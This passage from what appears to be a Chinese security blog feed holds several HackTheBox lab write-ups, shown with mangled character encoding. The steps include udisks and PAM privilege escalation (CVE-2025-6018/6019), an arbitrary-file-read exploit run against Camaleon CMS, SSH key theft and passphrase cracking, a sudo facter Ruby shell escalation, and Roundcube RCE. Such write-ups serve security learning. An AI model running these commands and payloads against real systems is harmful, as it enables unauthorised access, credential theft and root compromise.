--wordlist=/usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><p>å¾—åˆ°phileasfogg3çš„å¯†ç ä¸º<code>!QAZ2wsx</code></p><h2 id="ROOT"><a href="#ROOT" class="headerlink" title="ROOT"></a>ROOT</h2><p>åœ¨<code>/var/mail/</code>ç›®å½•ä¸‹å¯ä»¥è·å–phileasfogg3é‚®ç®±ä¸­çš„å†…å®¹ï¼Œè¿™é‡Œç»™å‡ºäº†æç¤ºè¦åˆ©ç”¨udisksæ¥è¿›è¡Œææƒ</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Attention all users,</span><br><span class="line"></span><br><span class="line">Unusual activity has been observed from the udisks daemon (udisksd). No confirmed compromise at this time, but increased vigilance is required.</span><br><span class="line"></span><br><span class="line">Do not connect untrusted external media. Review your sessions for suspicious activity. Administrators should review udisks and system logs and apply pending updates.</span><br><span class="line"></span><br><span class="line">Report any signs of compromise immediately to headmonitor@pterodactyl.htb</span><br><span class="line"></span><br><span class="line">â€” HeadMonitor</span><br><span class="line">System Administrator</span><br></pre></td></tr></table></figure><p>æœåˆ°ä¸€ä¸ªææƒåˆ©ç”¨é“¾ï¼ˆ<a href="https://www.secrss.com/articles/80016%EF%BC%89CVE-2025-6018%E3%80%81CVE-2025-6019">https://www.secrss.com/articles/80016ï¼‰CVE-2025-6018ã€CVE-2025-6019</a></p><h3 id="CVE-2025-6018"><a href="#CVE-2025-6018" class="headerlink" title="CVE-2025-6018"></a>CVE-2025-6018</h3><p>è¯¥æ¼æ´å…è®¸è¿œç¨‹éç‰¹æƒæ”»å‡»è€…å¼ºåˆ¶pam_envæ¨¡å—å°†ä»»æ„å˜é‡æ·»åŠ åˆ° PAM çš„ç¯å¢ƒä¸­ï¼Œä»¥è·å– polkit ç­–ç•¥çš„â€œallow_activeâ€è®¤è¯ï¼Œä»è€Œè·å¾—æœ¬åœ°ç”¨æˆ·æƒé™(å¯æ‰§è¡Œå…³æœºã€è®¿é—®æ•æ„Ÿæ¥å£ç­‰æ“ä½œ)</p><h3 id="CVE-2025-6019"><a href="#CVE-2025-6019" class="headerlink" title="CVE-2025-6019"></a>CVE-2025-6019</h3><p>è¯¥æ¼æ´æºäºudiskså®ˆæŠ¤è¿›ç¨‹æŒ‚è½½æ–‡ä»¶ç³»ç»Ÿä¸­ä¼šè°ƒç”¨libblockdevåº“ï¼Œè€ŒlibblockdevæŒ‚è½½æ—¶æ²¡æœ‰ä½¿ç”¨ nosuid å’Œ nodev æ ‡å¿—ï¼Œè‡´ä½¿æ‹¥æœ‰â€œallow_activeâ€æƒé™çš„ç”¨æˆ·å¯åˆ©ç”¨æ­¤æ¼æ´è·å– root æƒé™</p><h3 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h3><p>åœ¨githubä¸‹è½½expï¼ˆ<a href="https://github.com/muyuanlove/CVE-2025-6018-CVE-2025-6019-Privilege-Escalation-Exploit%EF%BC%89">https://github.com/muyuanlove/CVE-2025-6018-CVE-2025-6019-Privilege-Escalation-Exploitï¼‰</a></p><p><strong>0x01 åˆ¶ä½œæ¶æ„é•œåƒæ–‡ä»¶</strong></p><p>åœ¨æ”»å‡»æœºä¸Šä¾æ¬¡æ‰§è¡Œä»¥ä¸‹å‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Create 300MB XFS image</span></span><br><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=/dev/zero of=xfs.image bs=1M count=300</span><br><span class="line">mkfs.xfs -f xfs.image</span><br><span class="line"></span><br><span class="line"><span class="comment"># Mount and install SUID bash</span></span><br><span class="line"><span class="built_in">mkdir</span> mnt</span><br><span class="line"><span class="built_in">sudo</span> mount -t xfs xfs.image mnt</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">cp</span> /bin/bash mnt/bash</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">chmod</span> 4755 mnt/bash</span><br><span class="line"><span class="built_in">sudo</span> umount mnt</span><br><span class="line"><span class="built_in">rmdir</span> mnt</span><br></pre></td></tr></table></figure><p>åˆ›å»ºå®Œæˆåå°†é•œåƒæ–‡ä»¶ä¸Šä¼ è‡³é¶æœº</p><p><strong>0x02 åˆ©ç”¨CVE-2025-6018</strong></p><p>åœ¨é¶æœºä¸Šé…ç½®PAM</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> &gt; ~/.pam_environment &lt;&lt; <span class="string">&#x27;EOF&#x27;</span></span><br><span class="line">XDG_SEAT OVERRIDE=seat0</span><br><span class="line">XDG_VTNR OVERRIDE=1</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><p>é…ç½®å®Œæˆåé€€å‡ºï¼Œé‡æ–°ç™»é™†</p><p><strong>0x03 åˆ©ç”¨CVE-2025-6019</strong></p><p>é‡æ–°ä½¿ç”¨sshç™»å½•åï¼Œå°†<code>exp.sh</code>ï¼ˆgithubä¸‹è½½çš„ï¼‰ä¸Šä¼ è‡³é¶æœºï¼Œç„¶åæ‰§è¡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># éªŒè¯æ˜¯å¦æœ‰allow_activeæƒé™</span></span><br><span class="line">gdbus call --system --dest org.freedesktop.login1 \</span><br><span class="line">    --object-path /org/freedesktop/login1 \</span><br><span class="line">    --method org.freedesktop.login1.Manager.CanReboot</span><br><span class="line"><span class="comment"># æ‰§è¡Œææƒè„šæœ¬</span></span><br><span class="line">bash exp.sh</span><br></pre></td></tr></table></figure><p>å³å¯æ‹¿åˆ°rootæƒé™</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash-5.2# <span class="built_in">id</span></span><br><span class="line">uid=1002(phileasfogg3) gid=100(<span class="built_in">users</span>) euid=0(root) <span class="built_in">groups</span>=100(<span class="built_in">users</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> HackTheBox </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE-2025-49132 </tag>
            
            <tag> bcrypt </tag>
            
            <tag> CVE-2025-6018 </tag>
            
            <tag> CVE-2025-6019 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB-Facts</title>
      <link href="/2026/02/02/HTB-Facts/"/>
      <url>/2026/02/02/HTB-Facts/</url>
      
        <content type="html"><![CDATA[<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>Nmapæ‰«æç«¯å£</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliğŸ‘»Thr2on1)-[~/Websec/HTB/Facts]</span><br><span class="line">â””â”€$ <span class="built_in">sudo</span> nmap -p- --min-rate 10000 10.129.35.87 -oA nmapscans/ports</span><br><span class="line">Nmap scan report <span class="keyword">for</span> facts.htb (10.129.35.87)</span><br><span class="line">Host is up (0.16s latency).</span><br><span class="line">Not shown: 65532 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">22/tcp    open  ssh</span><br><span class="line">80/tcp    open  http</span><br><span class="line">54321/tcp open  unknown</span><br></pre></td></tr></table></figure><p>å¼€æ”¾äº†22ã€80ã€54321ç«¯å£</p><h2 id="CVE-2024-46987"><a href="#CVE-2024-46987" class="headerlink" title="CVE-2024-46987"></a>CVE-2024-46987</h2><p>è®¿é—®webé¡µé¢ï¼Œæ ¹æ®ç½‘ç«™çš„CSS&#x2F;JSè·¯å¾„ï¼š<code>/assets/themes/camaleon_first/</code>å¯çŸ¥ç½‘ç«™é‡‡ç”¨Camaleon CMSæ­å»ºã€‚</p><p>è®¿é—®adminç›®å½•ï¼Œå¯ä»¥æ³¨å†Œç™»å½•ã€‚ç»è¿‡Googleå‘ç°Camaleon CMSåå°å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–ï¼Œåœ¨githubä¸‹è½½è„šæœ¬<a href="https://github.com/Goultarde/CVE-2024-46987%E3%80%82">https://github.com/Goultarde/CVE-2024-46987ã€‚</a></p><p>åˆ©ç”¨æ³¨å†Œçš„è´¦å·è¿›è¡Œæ–‡ä»¶è¯»å–</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliğŸ‘»Thr2on1)-[~/Websec/HTB/Facts/CVE-2024-46987]</span><br><span class="line">â””â”€$ python3 CVE-2024-46987.py -u http://facts.htb/ -l 123 -p 123 /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line"><span class="built_in">sync</span>:x:4:65534:<span class="built_in">sync</span>:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin</span><br><span class="line">_apt:x:42:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin</span><br><span class="line">usbmux:x:100:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin</span><br><span class="line">messagebus:x:102:102::/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin</span><br><span class="line">pollinate:x:103:1::/var/cache/pollinate:/bin/false</span><br><span class="line">polkitd:x:991:991:User <span class="keyword">for</span> polkitd:/:/usr/sbin/nologin</span><br><span class="line">syslog:x:104:104::/nonexistent:/usr/sbin/nologin</span><br><span class="line">uuidd:x:105:105::/run/uuidd:/usr/sbin/nologin</span><br><span class="line">tcpdump:x:106:107::/nonexistent:/usr/sbin/nologin</span><br><span class="line">tss:x:107:108:TPM software stack,,,:/var/lib/tpm:/bin/false</span><br><span class="line">landscape:x:108:109::/var/lib/landscape:/usr/sbin/nologin</span><br><span class="line">fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin</span><br><span class="line">sshd:x:109:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash</span><br><span class="line">william:x:1001:1001::/home/william:/bin/bash</span><br><span class="line">_laurel:x:101:988::/var/log/laurel:/bin/false</span><br></pre></td></tr></table></figure><p>å­˜åœ¨ä¸¤ä¸ªå¯ç™»å½•çš„ç”¨æˆ·</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash</span><br><span class="line">william:x:1001:1001::/home/william:/bin/bash</span><br></pre></td></tr></table></figure><p>è¯»å–user.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliğŸ‘»Thr2on1)-[~/Websec/HTB/Facts/CVE-2024-46987]</span><br><span class="line">â””â”€$ python3 CVE-2024-46987.py -u http://facts.htb/ -l 123 -p 123 /home/william/user.txt</span><br><span class="line">6ef5c0d422fc224e982adbed988d1d44</span><br></pre></td></tr></table></figure><h2 id="Foothold"><a href="#Foothold" class="headerlink" title="Foothold"></a>Foothold</h2><p>è¯»å–sshå¯†é’¥ï¼Œå°è¯•è¯»å–id_rsaæ²¡èƒ½è¯»åˆ°ã€‚åœ¨AIçš„æç¤ºä¸‹è¯»äº†authorized_keysæ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliğŸ‘»Thr2on1)-[~/Websec/HTB/Facts/CVE-2024-46987]</span><br><span class="line">â””â”€$ python3 CVE-2024-46987.py -u http://facts.htb/ -l 123 -p 123 /home/trivia/.ssh/authorized_keys</span><br><span class="line">ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJZbWGFe1ScRexbSkkCg7IBVrlxhzJKCC433yUP75zSe</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°ç§é’¥åŠ å¯†ç±»å‹æ˜¯ed25519ï¼Œå¯ä»¥è¯»å–id_ed25519</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliğŸ‘»Thr2on1)-[~/Websec/HTB/Facts/CVE-2024-46987]</span><br><span class="line">â””â”€$ python3 CVE-2024-46987.py -u http://facts.htb/ -l 123 -p 123 /home/trivia/.ssh/id_ed25519     </span><br><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABBponzeuN</span><br><span class="line">I0RdixIiDl7OfQAAAAGAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIJZbWGFe1ScRexbS</span><br><span class="line">kkCg7IBVrlxhzJKCC433yUP75zSeAAAAoA2DmipF8Ybf8uWSGxCGTIcNZxH0sznfDeLdKY</span><br><span class="line">DF7gkgE1h7qv2V4hF3Oll5ke0tct2peCZTIPJC28lJK57knHmbaXy+v30T6RWzE+xiK7U+</span><br><span class="line">d/CmZ4tQKCjLpquSinfxckgpeOPjeQSd8AQHCUqU0xV8ddtFCxJzSnrEO29izgDIOjexn0</span><br><span class="line">66JLUXKgCTwL9mfM5pZIn6ssoPZWg+9Om1Tk4=</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure><p>å°†å…¶ä¿å­˜åœ¨æœ¬åœ°ï¼Œç„¶åsshè¿æ¥æœåŠ¡å™¨ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliğŸ‘»Thr2on1)-[~/Websec/HTB/Facts/CVE-2024-46987]</span><br><span class="line">â””â”€$ ssh trivia@10.129.3.9 -i id_ed25519                                                      </span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">&#x27;id_ed25519&#x27;</span>:</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå‘ç°ç§é’¥è¢«åŠ å¯†äº†ï¼Œä½¿ç”¨johnçˆ†ç ´å¯†ç </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliğŸ‘»Thr2on1)-[~/Websec/HTB/Facts/CVE-2024-46987]</span><br><span class="line">â””â”€$ ssh2john id_ed25519 &gt; ssh_hash     </span><br><span class="line">                                                                                                                                                                                                </span><br><span class="line">â”Œâ”€â”€(kaliğŸ‘»Thr2on1)-[~/Websec/HTB/Facts/CVE-2024-46987]</span><br><span class="line">â””â”€$ john ssh_hash --wordlist=/usr/share/wordlists/rockyou.txt </span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])</span><br><span class="line">Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Cost 2 (iteration count) is 24 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Will run 8 OpenMP threads</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">dragonballz      (id_ed25519)     </span><br><span class="line">1g 0:00:00:52 DONE (2026-02-14 00:08) 0.01920g/s 61.44p/s 61.44c/s 61.44C/s billy1..imissu</span><br><span class="line">Use the <span class="string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably</span><br><span class="line">Session completed.</span><br></pre></td></tr></table></figure><p>ç„¶åå†æ¬¡å°è¯•ç™»å½•å¹¶è¾“å…¥å¯†é’¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">trivia@facts:~$ <span class="built_in">id</span></span><br><span class="line">uid=1000(trivia) gid=1000(trivia) <span class="built_in">groups</span>=1000(trivia)</span><br></pre></td></tr></table></figure><h2 id="ROOT"><a href="#ROOT" class="headerlink" title="ROOT"></a>ROOT</h2><p>æŸ¥çœ‹å¯èƒ½çš„ææƒè·¯å¾„</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">trivia@facts:~$ <span class="built_in">sudo</span> -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> trivia on facts:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty</span><br><span class="line"></span><br><span class="line">User trivia may run the following commands on facts:</span><br><span class="line">    (ALL) NOPASSWD: /usr/bin/facter</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>triviaå¯ä»¥æ‰§è¡Œ&#x2F;usr&#x2F;bin&#x2F;facterå‘½ä»¤ï¼Œfacteræ˜¯Puppetç”¨äºæ”¶é›†ç³»ç»Ÿfactsçš„å·¥å…·ã€‚</p><p>å…¶ä¸­<code>--custom-dir</code>å‚æ•°ç”¨æ¥æŒ‡å®šè‡ªå®šä¹‰è„šæœ¬æ‰€åœ¨çš„ç›®å½•å¹¶åŠ è½½å®ƒï¼Œä»¥æ­¤æ¥æ”¶é›†è‡ªå®šä¹‰çš„factsä¿¡æ¯ã€‚</p><p>ç”Ÿæˆæ¶æ„rubyè„šæœ¬</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;exec(&quot;/bin/bash&quot;)&#x27;</span> &gt; root.rb</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œfacterå‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">trivia@facts:~$ <span class="built_in">sudo</span> facter --custom-dir .</span><br><span class="line">root@facts:/home/trivia# <span class="built_in">id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line">root@facts:/home/trivia# <span class="built_in">cat</span> /root/root.txt </span><br><span class="line">bc3d9b8d771cd78fdcc1591c7219ec33</span><br><span class="line">root@facts:/home/trivia#</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> HackTheBox </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE-2024-46987 </tag>
            
            <tag> Sudo </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB-Outbound</title>
      <link href="/2025/07/25/HTB-Outbound/"/>
      <url>/2025/07/25/HTB-Outbound/</url>
      
        <content type="html"><![CDATA[<p>é¢˜ç›®ç»™äº†åˆå§‹è´¦æˆ·ï¼štyler &#x2F; LhKL1o9Nm3X2</p><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>æ‰«æç«¯å£ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- --min-rate 10000 10.10.11.77</span><br></pre></td></tr></table></figure><p><img src="Pasted%20image%2020250724211031.png" alt="Pasted image 20250724211031"><br>å¼€æ”¾äº†22ã€80ç«¯å£<br>æ‰«ä¸€ä¸‹è¯¦ç»†ä¿¡æ¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p22,80 -sV -sC 10.10.11.77</span><br></pre></td></tr></table></figure><p><img src="Pasted%20image%2020250724211518.png" alt="Pasted image 20250724211518"><br>å°†<code>10.10.11.77 mail.outbound.htb</code>åŠ å…¥åˆ°hostsæ–‡ä»¶ä¸­ </p><h2 id="Nuclei"><a href="#Nuclei" class="headerlink" title="Nuclei"></a>Nuclei</h2><p>åˆå§‹è´¦å·æ— æ³•ç™»å½•22ç«¯å£ï¼Œç”¨Nucleiæ‰«æä¸€ä¸‹80ç«¯å£</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nuclei -u http://mail.outbound.htb</span><br></pre></td></tr></table></figure><p><img src="Pasted%20image%2020250724211908.png" alt="Pasted image 20250724211908"><br>æ‰«æå‡ºä¸€ä¸ªCVE-2025-49113ï¼Œåœ¨ç½‘ä¸Šæœç´¢ä¿¡æ¯ï¼Œæ˜¯Roundcube RCEæ¼æ´<br>ä½¿ç”¨ç½‘ä¸Šç°æˆçš„expï¼Œé…åˆåˆå§‹è´¦å·æ‹¿åˆ°shell<br><img src="Pasted%20image%2020250724221100.png" alt="Pasted image 20250724221100"></p><h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><p>ä¼ fscanæ‰«ææœåŠ¡ï¼Œå‘ç°æœ‰mysqlæœåŠ¡ï¼ŒæŸ¥çœ‹ç½‘ç«™çš„é…ç½®æ–‡ä»¶ï¼Œå¯ä»¥æ‰¾åˆ°mysqlè´¦å·å¯†ç ã€‚<br>ä½¿ç”¨mysqldumpå¯¼å‡ºæ•°æ®åº“æ•°æ®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">musqldump -u roundcube -p roundcube &gt; roundcube.sql</span><br></pre></td></tr></table></figure><p>sessionè¡¨ä¸­ï¼Œè®°å½•äº†ç”¨æˆ·ç™»å½•çš„sessionè®°å½•<br><img src="Pasted%20image%2020250724223904.png" alt="Pasted image 20250724223904"><br>å°†sessionå­—ç¬¦ä¸²è§£ç ï¼Œå¯ä»¥æ‹¿åˆ°passwordï¼Œä½†è¿™æ˜¯åŠ å¯†è¿‡çš„<br><img src="Pasted%20image%2020250724224005.png" alt="Pasted image 20250724224005"></p><h2 id="3DES"><a href="#3DES" class="headerlink" title="3DES"></a>3DES</h2><p>åœ¨é…ç½®æ–‡ä»¶ä¸­æˆ‘ä»¬å¯ä»¥æ‰¾åˆ°des_key<br><img src="Pasted%20image%2020250724224422.png" alt="Pasted image 20250724224422"><br>åœ¨æºç ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°ï¼Œé»˜è®¤çš„åŠ å¯†æ–¹å¼æ˜¯ï¼š<code>DES-EDE3-CBC</code> ä¹Ÿå°±æ˜¯3DECä¸­çš„CBCæ¨¡å¼<br><img src="Pasted%20image%2020250725101954.png" alt="Pasted image 20250725101954"><br>æˆ‘ä»¬å·²ç»çŸ¥é“äº†å¯†é’¥ã€å¯†æ–‡è¿˜éœ€è¦çŸ¥é“IV(åˆå§‹å‘é‡)<br><img src="Pasted%20image%2020250725102933.png" alt="Pasted image 20250725102933"><br>iv_sizeæ˜¯é»˜è®¤çš„8ä¸ªå­—èŠ‚ï¼Œivçš„å€¼ä¸ºå¯†æ–‡çš„å‰8ä¸ªå­—èŠ‚ã€‚<br>å¼€å§‹è§£å¯†<br><img src="Pasted%20image%2020250725103427.png" alt="Pasted image 20250725103427"><br>å¯ä»¥æ‹¿åˆ°jacobçš„password<br>åˆ‡æ¢åˆ°jacobç”¨æˆ·ã€‚<br>åœ¨jacobå®¶ç›®å½•ä¸‹æ‰¾åˆ°ä¸€ä¸ªé‚®ä»¶ï¼Œé‡Œé¢æœ‰ç™»å½•å¯†é’¥ï¼Œå°è¯•sshç™»å½•ã€‚<br><img src="Pasted%20image%2020250725103722.png" alt="Pasted image 20250725103722"></p><h2 id="ROOT"><a href="#ROOT" class="headerlink" title="ROOT"></a>ROOT</h2><p>æŸ¥çœ‹sudoers æ–‡ä»¶ï¼Œå‘ç°å¯ä»¥æ‰§è¡Œbelowå‘½ä»¤<br><img src="Pasted%20image%2020250725104005.png" alt="Pasted image 20250725104005"><br>æœç´¢belowå‘½ä»¤ææƒï¼Œæ‰¾åˆ°åˆ©ç”¨æ–‡ç« ï¼š<a href="https://blog.csdn.net/Python_0011/article/details/146822557">Linuxææƒæ¼æ´CVE-2025-27591ï¼Œä»é›¶åŸºç¡€åˆ°ç²¾é€šï¼Œæ”¶è—è¿™ç¯‡å°±å¤Ÿäº†ï¼linux cve-CSDNåšå®¢</a></p><p>githubä¸Šæ‰¾expï¼Œä¼ è¿›å»ææƒã€‚<br><img src="Pasted%20image%2020250725104712.png" alt="Pasted image 20250725104712"><br><img src="Pasted%20image%2020250725104749.png" alt="Pasted image 20250725104749"><br>æˆåŠŸæ‹¿åˆ°rootæƒé™<br><img src="Pasted%20image%2020250725104834.png" alt="Pasted image 20250725104834"></p>]]></content>
      
      
      <categories>
          
          <category> HackTheBox </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> CVE-2025-49113 </tag>
            
            <tag> CVE-2025-27591 </tag>
            
            <tag> 3DES </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Flaskæ— å›æ˜¾RCE</title>
      <link href="/2025/05/29/Flask%E6%97%A0%E5%9B%9E%E6%98%BERCE/"/>
      <url>/2025/05/29/Flask%E6%97%A0%E5%9B%9E%E6%98%BERCE/</url>
      
